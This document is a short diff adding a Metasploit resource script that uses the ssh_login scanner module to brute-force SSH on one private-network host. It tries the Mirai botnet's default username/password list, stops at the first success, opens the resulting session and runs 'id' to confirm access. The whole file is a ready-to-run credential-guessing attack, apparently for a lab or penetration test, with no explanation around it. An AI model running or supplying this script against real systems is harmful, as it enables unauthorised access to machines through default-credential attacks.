@@ -1,0 +1,9 @@
+use auxiliary/scanner/ssh/ssh_login
+set rhost 172.31.101.18
+set verbose true
+set stop_on_success true
+set USERPASS_FILE /usr/share/wordlists/metasploit/mirai_user_pass.txt
+run
+sessions -1
+sleep 2
+id
